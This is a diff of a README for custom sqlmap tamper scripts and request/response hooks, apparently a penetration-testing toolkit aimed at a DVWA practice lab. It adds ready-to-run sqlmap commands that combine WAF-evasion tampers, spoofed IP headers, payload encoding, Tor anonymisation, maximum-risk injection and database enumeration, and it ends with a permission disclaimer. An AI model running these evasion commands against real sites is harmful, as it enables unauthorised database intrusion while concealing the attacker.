@@ -71,14 +71,14 @@ sqlmap --list-tampers | grep -E "(json_unicode_escape|math_exp_obfuscator|nested
 Once installed, use them individually or in combination:
 ```
 # Single tamper
-sqlmap -u "http://target.com?id=1" --tamper=json_unicode_escape
+sqlmap -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#" --tamper=json_unicode_escape
 
 # Stack multiple tampers (order matters)
-sqlmap -u "http://target.com?id=1" \
+sqlmap -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#" \
        --tamper=json_unicode_escape,math_exp_obfuscator,nested_versioned_comments,random_chunk_splitter
 
 # With other built‑in tampers
-sqlmap -u "http://target.com?id=1" \
+sqlmap -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#" \
        --tamper=json_unicode_escape,space2comment,randomcase
 ```
 
@@ -101,86 +101,176 @@ SETTINGS = {
 ```
 
 ## 🔧 Pre/Post‑Processing Hooks
-Beyond tamper scripts, sqlmap offers **pre‑processing** and **post‑processing** hooks that let you **modify every request before it’s sent** and **inspect/alter every response** before sqlmap processes it.  
+Beyond tamper scripts, sqlmap offers pre‑processing and post‑processing hooks that let you modify every request before it’s sent and inspect/alter every response before sqlmap processes it.
 
 This is invaluable for:
-* **Session management** – _automatically extract and inject CSRF tokens, JWTs, or nonces._  
-* **Custom encoding** – _encode payloads in Base64, hex, or your own scheme._  
-* **Header rotation** – _spoof `X‑Forwarded‑For`, rotate User‑Agents, add timestamps._  
-* **Response decoding** – _decompress gzip, unwrap Base64, extract JSON values._  
-* **Multi‑step authentication** – _handle login flows programmatically._  
+* **Session management** – _automatically extract and inject CSRF tokens, JWTs, or nonces._
+* **Custom encoding** – _encode payloads in Base64, hex, or your own scheme._
+* **Header rotation** – _spoof `X‑Forwarded‑For`, rotate User‑Agents, add timestamps._
+* **Response decoding** – _decompress gzip, unwrap Base64, extract JSON values._
+* **Multi‑step authentication** – _handle login flows programmatically._
 
-We provide **two levels** of hooks:
-
-## 🧩 Simple Examples: `preprocess.py` & `postprocess.py`
-These are minimal, single‑purpose scripts that demonstrate the hook concept:
-* `preprocess.py` – Injects a static CSRF token into every POST request and adds a custom header.
-* `postprocess.py` – Extracts a CSRF token from the response body and stores it (for the next request).
-Usage:
+## 🧠 Our Enhanced Architecture
+We've moved beyond simple single‑file hooks into a modular, production‑grade system:
 ```
-sqlmap -u "http://target.com/page?id=1" \
-       --preprocess=preprocess.py \
-       --postprocess=postprocess.py
+Processes/
+├── hooks.py          # The orchestrator – imports and exposes preprocess/postprocess to sqlmap
+├── preprocess.py     # Request‑side engine – handles headers, tokens, encoding, wrapping
+├── postprocess.py    # Response‑side engine – decodes, extracts tokens, handles auth
+└── headers.txt       # (Optional) User‑provided custom headers – one per line: Header: value
 ```
-These are **starter templates** – you can adapt them to your needs, but for serious work, we recommend the advanced `hooks.py` below.
+**OPTIONAL:** There is a `headers_example.txt` file that you can use as a reference point.
 
-## 🚀 Advanced All‑in‑One: `hooks.py`
+***Key improvements:***
+* **Modular separation** – each component focuses on a single responsibility.
+* **Smart header protection** – critical headers (`Host`, `Content-Length`, `Connection`) are never encoded or injected into, avoiding server errors.
+* **Custom headers via `headers.txt`** – users can paste session cookies, JWTs, or security tokens after manual login; if the file is empty or missing, the system falls back to defaults.
+* **Verbose logging** – every operation is logged to `sqlmap_preprocess.log` and `sqlmap_postprocess.log`, plus real‑time output to stderr for transparency.
+* **Full error handling** – any failure is caught and logged; sqlmap never crashes due to a hook issue.
 
-`hooks.py` is a **production‑grade**, fully configurable pre/post‑processing engine that consolidates everything into a single file.
-**Key features:**
-* **Token extraction & injection** – define regex patterns to pull tokens from response body/headers, then inject them into subsequent requests as parameters, headers, or cookies.
-* **Payload encoding** – encode injection payloads with Base64, hex, double URL‑encode, or custom methods.
-* **Header manipulation** – add static headers, rotate User‑Agent, add timestamps.
-* **Response decoding** – handle gzip, Base64, JSON extraction, and strip HTML comments.
-* **Comprehensive logging** – log all modifications to a file and console for debugging.
-* **Multi‑step authentication** – skeleton for login flows (can be extended with requests library).
-  
-**How to use it:**
-1. Save `hooks.py` in your working directory.
-2. Edit the `SETTINGS` dict at the top to match your target (enable/disable features, adjust regex patterns, choose encoding, etc.).
-3. Run sqlmap with both flags pointing to the same file:
+## 🚀 How to Use the New System
+1. Place the `Processes/` folder in your working directory (or anywhere you like).
+2. (Optional) Add custom headers – edit `Processes/headers.txt`:
 ```
-sqlmap -u "http://target.com/page?id=1" \
-       --preprocess=hooks.py \
-       --postprocess=hooks.py \
+# Example headers – one per line
+Cookie: PHPSESSID=abc123; security=low
+Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
+X-Custom-Header: MyValue
+```
+3. Run sqlmap pointing to `hooks.py`:
+```
+sqlmap -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#" \
+       --preprocess=./Processes/hooks.py \
+       --postprocess=./Processes/hooks.py \
        --batch --level=5
 ```
+## 🔧 Customisation & Configuration
+Both `preprocess.py` and `postprocess.py` include a SETTINGS dict at the top – tweak these to fit your target:
 
-***Why it’s important:***
-* **Handles dynamic tokens** – no more manual cookie/token updates; the hooks do it live.
-* **Defeats WAFs** – encode payloads on the fly to bypass signature‑based filters.
-* **Saves time** – eliminates the need for separate `--cookie`, `--headers`, or `--data` fiddling.
-
-Customisation example – inside `hooks.py`, you’ll find:
+* `preprocess.py` settings:
 ```
 SETTINGS = {
+    "headers": {
+        "add": {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+            "X-Originating-IP": "127.0.0.1",
+        },
+        "randomize_user_agent": True,
+        "add_timestamp": True,
+        "custom_headers_file": "headers.txt",          # path to user‑provided headers
+        "protected_headers": ["host", "content-length", "connection", ...],  # never touched
+    },
+    "payload_encoding": {
+        "enabled": True,
+        "method": "base64",          # base64 | hex | double_url | custom
+        "wrap_json": False,
+        "wrap_xml": False,
+    },
+    "token_injection": {
+        "enabled": True,
+        "inject_into": {
+            "csrf": {"target": "data", "param": "csrf_token"},
+            "jwt":   {"target": "headers", "param": "Authorization", "prefix": "Bearer "},
+        }
+    },
+}
+```
+* `postprocess.py` settings:
+```
+SETTINGS = {
+    "response": {
+        "decode_gzip": True,
+        "decode_base64": False,
+        "extract_json": False,
+        "json_key": "data",
+        "strip_html_comments": False,
+    },
     "token_extract": {
         "enabled": True,
         "patterns": [
             (r'body', r'name=["\']csrf_token["\']\s+value=["\']([^"\']+)["\']', 'csrf'),
+            (r'body', r'"access_token":"([^"]+)"', 'jwt'),
             ...
         ],
-        "inject_into": {
-            "csrf": {"target": "data", "param": "csrf_token"},
-            ...
-        }
     },
-    "payload_encoding": {
-        "enabled": True,
-        "method": "base64",   # or 'hex', 'double_url', 'custom'
+    "auth_flow": {
+        "enabled": False,
+        "success_indicator": "Dashboard",
     },
-    ...
 }
 ```
-Simply tweak these settings to fit your target, and you’re good to go.  
-  
-**Pro tip:** _combine the hooks with your favourite tampers for maximum evasion:_
+### 💡 Pro Tips
+* **Combine hooks with tampers** for maximum evasion:
 ```
-sqlmap -u "http://target.com/api?id=1" \
-       --preprocess=hooks.py --postprocess=hooks.py \
+sqlmap -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#" \
+       --preprocess=./Processes/hooks.py --postprocess=./Processes/hooks.py \
        --tamper=json_unicode_escape,math_exp_obfuscator
 ```
-This gives you ***unmatched control*** over every aspect of the request/response cycle.
+* **Debugging** – _check the log files (`sqlmap_preprocess.log`, `sqlmap_postprocess.log`) for detailed operation traces._
+* **Custom encoding** – _override the `custom_encode()` function in `preprocess.py` with your own transformation._
+
+# 🚀 Running the Ultimate SQLMap Operation
+The following command demonstrates the full potential of our tamper suite combined with advanced sqlmap features – including Tor anonymisation, pre/post‑processing hooks, and layered WAF evasion.
+```
+$ python3 SQLMap_Tampers.py
+*COPY THE DESIRED TAMPER SCRIPTS YOU NEED*
+$ sqlmap --risk=3 --level=5 --random-agent --tor --tor-type=SOCKS5 --time-sec=10 --threads=3 --batch --tamper=json_unicode_escape,math_exp_obfuscator,nested_versioned_comments,random_chunk_splitter ---preprocess=/home/beardedviking/Desktop/PythonTools/SQLMap_Tampers/Processes/hooks.py --postprocess=/home/beardedviking/Desktop/PythonTools/SQLMap_Tampers/Processes/hooks.py --flush-session --dbms=MySQL --crawl=5 --forms --technique=BEUSTQ --banner --dbs --url "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#"
+```
+
+### ⚙️ Command Breakdown
+
+| Flag / Option | Purpose |
+|---------------|---------|
+| `--risk=3 --level=5` | **Maximum aggression** – uses high‑risk payloads and deep recursion. |
+| `--random-agent` | **User‑Agent rotation** – evades basic fingerprinting. |
+| `--tor --tor-type=SOCKS5` | **Anonymisation** – routes all traffic through the Tor network. |
+| `--time-sec=10 --threads=3` | **Blind detection** – adds time‑based delays for blind SQLi; keeps threads low for stability. |
+| `--batch` | **Non‑interactive mode** – auto‑accepts all prompts for unattended scanning. |
+| `--tamper=...` | **Custom evasion** – our proprietary tampers bypass modern WAFs. |
+| `--preprocess/--postprocess` | **Request/Response hacking** – our `hooks.py` orchestrates dynamic token handling, encoding, and decoding. |
+| `--flush-session` | **Clean session** – forces a fresh scan without cached results. |
+| `--dbms=MySQL` | **Optimisation** – targets MySQL, reducing noise and false positives. |
+| `--crawl=5 --forms` | **Deep discovery** – crawls up to 5 levels deep and tests all HTML forms. |
+| `--technique=BEUSTQ` | **All‑in‑one injection** – tests all supported techniques (Boolean, Error, Union, Stacked, Time‑based, Inline). |
+| `--banner --dbs` | **Enumeration** – retrieves database banner and lists all databases. |
+
+---
+
+### 🛡️ Why This Is the Ultimate Setup
+
+| Component | Benefit |
+|-----------|---------|
+| **Custom Tampers** | Our 4 proprietary tamper scripts (`json_unicode_escape`, `math_exp_obfuscator`, `nested_versioned_comments`, `random_chunk_splitter`) deliver **multi‑layered, randomized obfuscation** that defeats even advanced WAFs. |
+| **Pre/Post‑Processing** | The `hooks.py` orchestrator dynamically injects tokens, encodes payloads, and decodes responses – handling **session management, custom encoding, and response extraction** automatically. |
+| **Tor Integration** | **Full anonymity** – all traffic is routed through Tor, preventing IP‑based blocks. |
+| **Maximum Coverage** | Crawling, forms, and all injection techniques ensure **no vector is missed**. |
+
+---
+
+### 🔧 Quick Start – One‑Command Copy‑Paste
+
+> **Note:** Replace the target URL and adjust paths to your environment.
+
+```bash
+# Step 1: Navigate to your SQLMap_Tampers directory
+cd ~/SQLMap_Tampers
+
+# Step 2: Run the ultimate scan
+sqlmap --risk=3 --level=5 \
+       --random-agent \
+       --tor --tor-type=SOCKS5 --time-sec=10 --threads=3 \
+       --batch \
+       --tamper=json_unicode_escape,math_exp_obfuscator,nested_versioned_comments,random_chunk_splitter \
+       --preprocess=./Processes/hooks.py --postprocess=./Processes/hooks.py \
+       --flush-session \
+       --dbms=MySQL \
+       --crawl=5 --forms \
+       --technique=BEUSTQ \
+       --banner --dbs \
+       -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#"
+```
+
 
 # ⚠️ Disclaimer
 ***Use these tools only on systems you own or have explicit written permission to test.***
